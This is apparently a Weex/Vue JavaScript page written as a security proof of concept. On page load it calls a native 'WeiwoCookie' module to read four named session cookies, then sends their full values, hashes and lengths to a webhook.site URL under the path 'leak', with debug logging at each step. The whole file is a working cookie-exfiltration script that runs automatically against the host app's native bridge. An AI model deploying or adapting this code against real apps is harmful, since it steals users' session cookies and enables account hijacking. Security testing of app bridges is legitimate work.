!function () {

function smallHash(value) {
  value = value == null ? "" : String(value);
  var h = 2166136261;
  for (var i = 0; i < value.length; i++) {
    h ^= value.charCodeAt(i);
    h += (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24);
  }
  return (h >>> 0).toString(16);
}

function parseMaybeJson(value) {
  if (typeof value !== "string") return value || {};
  try { return JSON.parse(value); }
  catch (e) { return { parse_error: true, raw_len: String(value).length }; }
}

function safeKeys(obj) {
  if (!obj || typeof obj !== "object") return [];
  var keys = [];
  for (var k in obj) {
    if (Object.prototype.hasOwnProperty.call(obj, k)) keys.push(k);
  }
  return keys.sort();
}

function summarize(raw) {
  var parsed = parseMaybeJson(raw);
  var data = parsed && typeof parsed === "object" &&
    Object.prototype.hasOwnProperty.call(parsed, "data")
    ? parseMaybeJson(parsed.data)
    : parsed;
  var out = {};
  var keys = ["vvc_status", "vvc_r", "vvc_n", "vvc_s"];
  for (var i = 0; i < keys.length; i++) {
    var k = keys[i];
    var v = data && data[k];
    out[k] = {
      present: v != null && String(v).length > 0,
      len: v == null ? 0 : String(v).length,
      h: v == null ? "" : smallHash(v),
      value: v || ""
    };
  }
  out.meta = {
    topKeys: safeKeys(parsed),
    code: parsed && parsed.code,
    msg: parsed && parsed.msg,
    dataKeys: safeKeys(data),
    rawLen: typeof raw === "string" ? raw.length : 0
  };
  out.raw = raw;
  return out;
}

// ★ 修复 ASI Bug：return 和 weex.requireModule 在同一行
function getModule(name) {
  console.log("[getModule] try get: " + name);
  try {
    if (typeof weex !== "undefined" && weex.requireModule) {
      var m = weex.requireModule(name);
      console.log("[getModule] " + name + " => " + (m ? "OK" : "null"));
      return m;
    } else {
      console.log("[getModule] weex undefined or no requireModule");
    }
  } catch (e) {
    console.log("[getModule] exception: " + String(e));
  }
  return null;
}

function send(path, obj) {
  console.log("[send] path=" + path);
  try {
    var stream = getModule("stream");
    if (!stream || !stream.fetch) {
      console.log("[send] stream unavailable, abort");
      return;
    }
    var url = "https://webhook.site/ee091332-0cec-4592-8016-ad59ec6827d8" + path +
      "?d=" + encodeURIComponent(JSON.stringify(obj));
    console.log("[send] fetch url=" + url.slice(0, 120));
    stream.fetch({ method: "GET", url: url, type: "text" }, function (res) {
      console.log("[send] fetch callback status=" + (res && res.status));
    });
  } catch (e) {
    console.log("[send] exception: " + String(e));
  }
}

function run(stage) {
  console.log("[run] stage=" + stage);
  var cookie = getModule("WeiwoCookie");
  console.log("[run] WeiwoCookie=" + (cookie ? "OK" : "null"));
  send(stage, { loaded: true, hasCookieModule: !!cookie });
  if (!cookie || !cookie.get) {
    console.log("[run] no cookie.get, exit");
    return;
  }
  try {
    console.log("[run] calling cookie.get");
    var ret = cookie.get(JSON.stringify({
      names: ["vvc_status", "vvc_r", "vvc_n", "vvc_s"]
    }), function (res) {
      console.log("[run] cookie.get async callback, res type=" + typeof res);
      send("leak", summarize(res));
    });
    console.log("[run] cookie.get sync ret type=" + typeof ret);
    send("ret", summarize(ret));
  } catch (e) {
    console.log("[run] exception: " + String(e));
    send("error", { message: String(e).slice(0, 160) });
  }
}

var app = {
  created: function () {
    console.log("[app] created hook");
    run("stage_created");
  },
  render: function (h) {
    return h("div", { staticClass: ["wrapper"] }, [
      h("text", { staticClass: ["msg"] }, ["audit"])
    ]);
  },
  style: {
    wrapper: { width: "1080", minHeight: "400", backgroundColor: "#ffffff" },
    msg: { fontSize: "42", color: "#222222" }
  }
};

console.log("[top] script start");
run("stage_top");
try {
  weex.requireModule("meta").setViewport({ width: 1080 });
  console.log("[top] setViewport ok");
} catch (e) {
  console.log("[top] setViewport exception: " + String(e));
}
new Vue(app);
console.log("[top] Vue created");

}();
